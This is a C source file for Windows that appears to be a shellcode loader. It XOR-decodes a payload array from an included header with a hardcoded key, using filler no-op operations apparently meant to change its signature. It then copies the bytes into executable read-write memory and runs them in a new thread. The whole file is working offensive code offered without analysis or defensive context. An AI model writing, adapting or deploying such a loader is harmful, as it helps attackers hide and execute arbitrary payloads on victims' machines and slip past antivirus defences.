#include "Shellcode.h"
#include "Windows.h"
#include <stdio.h>

BOOL XOR(
    _In_ PUCHAR Data,
    _In_ SIZE_T DataSize,
    _In_ PUCHAR Key,
    _In_ SIZE_T KeySize
) {
    printf( "Xoring with key: %s", Key );
    printf( "DataSize: %d, KeySize: %d", DataSize, KeySize );
    for ( SIZE_T i = 0; i < DataSize; i++ ) {
        BYTE temp = Key[i % KeySize];
        Data[i] ^= temp;
        temp ^= 0x41;
        temp ^= 0x41;

        Data[i] ^= ( temp ^ temp );
    }
    return TRUE;
}

INT main( int argc, char ** argv ) {

    LPVOID Memory       = VirtualAlloc( NULL, SHELLCODE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    BOOL   WriteSuccess = { 0 };
    HANDLE Thread       = { 0 };

    if ( ! Memory ) {
        return 1;
    }

    // 8DD951E43322FDB2
    unsigned char key[] = { 0x8D, 0xD9, 0x51, 0xE4, 0x33, 0x22, 0xFD, 0xB2 };

    if ( ! XOR( Shellcode, SHELLCODE_SIZE, ( PUCHAR )&key, sizeof( key ) ) ) {
        return 1;
    }

    if ( ! ( WriteSuccess = WriteProcessMemory( GetCurrentProcess(), Memory, Shellcode, SHELLCODE_SIZE, NULL ) ) ) {
        return 1;
    }

    if ( ! ( Thread = CreateThread( NULL, 0, LPTHREAD_START_ROUTINE( Memory ), NULL, 0, NULL ) ) ) {
        return 1;
    }

    WaitForSingleObject( Thread, INFINITE );
    return 0;
}